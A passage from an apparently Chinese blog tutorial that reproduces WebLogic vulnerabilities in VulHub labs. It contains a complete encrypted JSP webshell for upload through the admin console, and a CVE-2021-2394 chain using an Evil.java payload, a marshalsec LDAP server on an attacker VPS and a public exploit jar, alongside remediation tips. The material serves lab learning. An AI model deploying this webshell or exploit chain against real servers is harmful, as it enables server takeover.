+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210180920756.png" data-fancybox="true"/></div></div>
+<p>如果出现以下情况可能是没有选中乱码进行copy to file</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210180920969.png" data-fancybox="true"/></div></div>
+
+<h5 id="后台上传webshell"><a href="#后台上传webshell" class="headerlink" title="后台上传webshell"></a>后台上传webshell</h5><p>获取到管理员密码后,登录后台.点击左侧的 Deployments,可见一个应用列表:</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210182205825.png" data-fancybox="true"/></div></div>
+<p>点击Install,选择”upload your file(s)”</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210180931839.png" data-fancybox="true"/></div></div>
+<p>上传war包.值得注意的是,我们平时tomcat用的war包不一定能够成功,你可以将你的webshell放到本项目的<code>web/jiangjiyue.war</code>这个压缩包中,再上传.上传成功后点下一步.</p>
+<blockquote>
+<p>上传的war文件是将一句话写在 jiangjiyue.jsp 中,再将 jiangjiyue.jsp 压缩成 jiangjiyue.zip ,再将jiangjiyue.zip改名为 jiangjiyue.war.</p>
+<p>一句话木马如下,密码为 pass</p>
+<p><code>&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if(request.getParameter(&quot;pass&quot;)!=null)&#123;String k=(&quot;&quot;+UUID.randomUUID()).replace(&quot;-&quot;,&quot;&quot;).substring(16);session.putValue(&quot;u&quot;,k);out.print(k);return;&#125;Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&gt;</code></p>
+</blockquote>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210180947005.png" data-fancybox="true"/></div></div>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210180948945.png" data-fancybox="true"/></div></div>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210180955777.png" data-fancybox="true"/></div></div>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210180951543.png" data-fancybox="true"/></div></div>
+
+<h5 id="冰蝎连接"><a href="#冰蝎连接" class="headerlink" title="冰蝎连接"></a>冰蝎连接</h5><div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402101225099.png" data-fancybox="true"/></div></div>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210181051896.png" data-fancybox="true"/></div></div>
+
+<h3 id="修复建议-5"><a href="#修复建议-5" class="headerlink" title="修复建议"></a>修复建议</h3><ol>
+<li>设置Config.do页面登录授权后访问</li>
+<li>IPS等防御产品可以加入相应的特征</li>
+<li>升级到官方最新版本</li>
+</ol>
+<h2 id="Weblogic反序列化漏洞-cve-2021-2394"><a href="#Weblogic反序列化漏洞-cve-2021-2394" class="headerlink" title="Weblogic反序列化漏洞(cve_2021_2394)"></a>Weblogic反序列化漏洞(cve_2021_2394)</h2><p>环境安装:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://security-1258894728.cos.ap-beijing.myqcloud.com/writeup/vulhub/weblogic/fmw_12.2.1.3.0_wls_Disk1_1of1.zip</span><br><span class="line">unzip fmw_12.2.1.3.0_wls_Disk1_1of1.zip</span><br><span class="line">java -jar fmw_12.2.1.3.0_wls.jar</span><br><span class="line">使用管理员运行:C:\Oracle\Middleware\Oracle_Home\user_projects\domains\wl_server\startWebLogic.cmd</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>请使用低版本的jdk安装weblogic进行测试 </p>
+<blockquote>
+<p>基于RMI的利用方式,JDK版本限制于6u132、7u131、8u121之前,在8u122及之后的版本中,加入了反序列化白名单的机制,关闭了RMI远程加载代码 基于LDAP的利用方式,JDK版本限制于6u211、7u201、8u191、11.0.1之前,在8u191版本中,Oracle对LDAP向量设置限制,发布了CVE-2018-3149,关闭JNDI远程类加载 From:</p>
+</blockquote>
+</li>
+<li><p>虚拟机中无法复现 </p>
+<blockquote>
+<p>后面看到了Iz2y 的EXP中有这篇说明:<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7498">手把手教你解决Weblogic CVE-2020-2551 POC网络问题</a>,应该就是这个问题了,这里我的理解是docker里面返回的地址是一个内网地址(172开头),我们攻击的机器只能访问外网的地址,因此导致发送不了攻击数据;但是本地就不一样了,本地是能够直接访问docker的网络的,所以本地就不会有问题,而在真实环境中也应该没有这种问题.</p>
+</blockquote>
+</li>
+</ul>
+<h3 id="漏洞概述-7"><a href="#漏洞概述-7" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>Oracle官方发布了2021年7月份安全更新通告,通告中披露了WebLogic组件存在高危漏洞,攻击者可以在未授权的情况下通过IIOP、T3协议对存在漏洞的WebLogic Server组件进行攻击.成功利用该漏洞的攻击者可以接管WebLogic Server.</p>
+<p>这是一个二次反序列化漏洞,是CVE-2020-14756和CVE-2020-14825的调用链相结合组成一条新的调用链来绕过weblogic黑名单列表.<br><strong>漏洞条件:</strong></p>
+<ul>
+<li>启用了IIOP、T3协议</li>
+<li>JDK版本符合JNDI注入条件</li>
+</ul>
+<p><strong>影响版本:</strong></p>
+<ol>
+<li>WebLogic Server 10.3.6.0.0 </li>
+<li>WebLogic Server 12.1.3.0.0 </li>
+<li>WebLogic Server 12.2.1.3.0 </li>
+<li>WebLogic Server 12.2.1.4.0 </li>
+<li>WebLogic Server 14.1.1.0.0</li>
+</ol>
+<h3 id="漏洞复现-7"><a href="#漏洞复现-7" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ol>
+<li><p>下载marshalsec利用marshalsec开启JNDI服务</p>
+<div class="tag-plugin link dis-select"><a class="link-card plain" title="" href="https://security-1258894728.cos.ap-beijing.myqcloud.com/writeup/vulhub/weblogic/marshalsec-0.0.3-SNAPSHOT-all.jar" target="_blank" rel="external nofollow noopener noreferrer" cardlink autofill="title,icon"><div class="left"><span class="title">https://security-1258894728.cos.ap-beijing.myqcloud.com/writeup/vulhub/weblogic/marshalsec-0.0.3-SNAPSHOT-all.jar</span><span class="cap link footnote">https://security-1258894728.cos.ap-beijing.myqcloud.com/writeup/vulhub/weblogic/marshalsec-0.0.3-SNAPSHOT-all.jar</span></div><div class="right"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/link/8f277b4ee0ecd.svg"></div></div></a></div> </li>
+<li><p>创建Evil.java,通过javac编译得到Evil.class </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210182208161.png" data-fancybox="true"/></div></div>
+<p><code>javac Exploit.java</code>必须是java1.8 </p>
+</li>
+<li><p>在VPS同目录下使用python开启一个http服务,并使用marshalsec开启JNDI服务 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8080</span><br><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://YOUR-VPS-IP:8080/#Evil&quot;</span> 6666</span><br></pre></td></tr></table></figure></li>
+</ol>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210182209638.png" data-fancybox="true"/></div></div> 
+
+<ol start="4">
+<li><p>利用exp进行复现 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/lz2y/CVE-2021-2394/releases/download/2.0/CVE_2021_2394_jar.zip</span><br><span class="line">java -jar CVE_2021_2394.jar 127.0.0.1 7001 ldap://YUR-IP-VPS:6666/Evil</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>结果</p>
+</li>
+</ol>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210182124937.png" data-fancybox="true"/></div></div>
+<h4 id="修复建议-6"><a href="#修复建议-6" class="headerlink" title="修复建议"></a>修复建议</h4><ul>
+<li>升级版本</li>
+</ul>
+
+<div class="article-footer fs14">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文由 <a href="https://jiangjiyue.github.io/">kill3r</a> 原创,采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+    <section id="share">
+      <div class="header"><span>分享文章</span></div>
+      <div class="body">
+        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="https://jiangjiyue.github.io/2022/10/18/55971a3e/" /></div>
+        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=https://jiangjiyue.github.io/2022/10/18/55971a3e/&title=VulHub-Weblogic漏洞复现 - SafeKiller Zone&pics=https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202401270923610.png&summary=
+    总字符数: 32.86K 
+    
+    
+    代码: 5.72K, 文本: 7.90K
+    
+    
+    预计阅读时间: 59 分钟
+    
+    
+
+‘wls-wsat’ XMLDecoder 反序..."><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/80c07e4dbb303.svg" /></a><a class="social share-item email" href="mailto:?subject=VulHub-Weblogic漏洞复现 - SafeKiller Zone&amp;body=https://jiangjiyue.github.io/2022/10/18/55971a3e/"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/a1b00e20f425d.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
+        
+        <div class="qrcode" id="qrcode-wechat" style="opacity:0;height:0">
+          <img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=https://jiangjiyue.github.io/2022/10/18/55971a3e/"/>
+        </div>
+        
+      </div>
+    </section>
+    </div>
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2022/10/20/16f1e4f4/">VulHub-Spring漏洞复现</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2022/09/12/491035d1/">安全加固之Linux软件包封装脚本分析</a></div></section></div>
+
+<div class="related-wrap" id="related-posts">
+    <section class='header'>
+      <div class='title cap theme'>您可能感兴趣的文章</div>
+    </section>
+    <section class='body'>
+    <div class="related-posts"><a class="item" href="\2023\03\08\cc894391\" title="VulHub-Atlassian_Jira漏洞复现"><span class="title">VulHub-Atlassian_Jira漏洞复现</span></a><a class="item" href="\2023\03\07\a2dd2e70\" title="VulHub-Atlassian_Confluence漏洞复现"><span class="title">VulHub-Atlassian_Confluence漏洞复现</span></a><a class="item" href="\2023\03\10\73f4594f\" title="VulHub-Drupal漏洞复现"><span class="title">VulHub-Drupal漏洞复现</span></a><a class="item" href="\2023\03\11\247b757\" title="VulHub-Fastjson漏洞复现"><span class="title">VulHub-Fastjson漏洞复现</span></a><a class="item" href="\2024\09\24\3c3f9499\" title="CS-Cobalt Strike必备知识"><span class="title">CS-Cobalt Strike必备知识</span></a></div></section></div>
+
+
+  <div class="related-wrap md-text" id="comments">
+    <section class='header cmt-title cap theme'>
+      <p>快来参与讨论吧~</p>
+
+    </section>
+    <section class='body cmt-body waline'>
+      
+
+<div id="waline_container" class="waline_thread"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </section>
+  </div>
+
+
+
+<footer class="page-footer footnote"><hr><div class="sitemap"><div class="sitemap-group"><span class="fs15">博客</span><a href="/">近期</a><a href="/categories/">分类</a><a href="/tags/">标签</a><a href="/archives/">归档</a><a href="/tools/">工具</a></div><div class="sitemap-group"><span class="fs15">笔记</span><a href="/wiki/tags/DevOps/index.html">DevOps</a><a href="/wiki/tags/Vulnerability/index.html">常见漏洞分析</a><a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a></div><div class="sitemap-group"><span class="fs15">社交</span><a href="/friends/">友链</a><a href="/comments/">留言板</a></div><div class="sitemap-group"><span class="fs15">更多</span><a href="/about/">关于本站</a><a target="_blank" rel="noopener" href="https://github.com/JiangJiYue">GitHub</a></div></div><div class="text"><center>
+  <p>本破站由 <a href="/">@SafeKiller Zone</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar">Stellar</a> 主题创建。<br>本博客部分素材来源于网络，如有侵权请联系<a href="mailto:jiangjiyue1@gmail.com">jiangjiyue1@gmail.com</a>删除<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+  <!--不蒜子计数器-->
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <span>本"页面"访问 <span id="busuanzi_value_page_pv"></span> 次 | 👀总访问 <span id="busuanzi_value_site_pv"></span> 次 | 总访客 <span id="busuanzi_value_site_uv"></span> 人</span>
+  <br>
+  <span id="runtime_span"></span>
+  <script type="text/javascript">
+    // JavaScript for showing runtime here
+  </script>
+</center>
+<div style="display: flex;justify-content: center;align-items: center;margin: 10px;">
+  <a target="_blank" rel="noopener" href="https://notbyai.fyi/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/Written-By-Human-white.png" style="width:140px;height:50px;margin-right: 10px " id='notbyai'></a>
+  <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/by-nc-sa.eu.png" style="width:140px;height:50px"></a>
+</div>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%98wls-wsat%E2%80%99-XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2017-10271"><span class="toc-text">‘wls-wsat’ XMLDecoder 反序列化漏洞(CVE-2017-10271)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%AF%B4%E6%98%8E"><span class="toc-text">攻击说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA"><span class="toc-text">靶场搭建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B"><span class="toc-text">漏洞探测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9Shell"><span class="toc-text">反弹Shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WLS-Core-Components-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2018-2628"><span class="toc-text">WLS Core Components 反序列化命令执行漏洞(CVE-2018-2628)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0-1"><span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-text">影响版本:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B-1"><span class="toc-text">漏洞探测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9Shell-1"><span class="toc-text">反弹Shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-1"><span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-CVE-2018-2894"><span class="toc-text">任意文件上传漏洞(CVE-2018-2894)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0-2"><span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-2"><span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83RCE-CVE-2019-2725"><span class="toc-text">未授权RCE(CVE-2019-2725)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0-3"><span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-3"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-3"><span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AA%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-CVE-2020-14882%E3%80%81CVE-2020-14883"><span class="toc-text">未认证远程命令执行(CVE-2020-14882、CVE-2020-14883)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0-4"><span 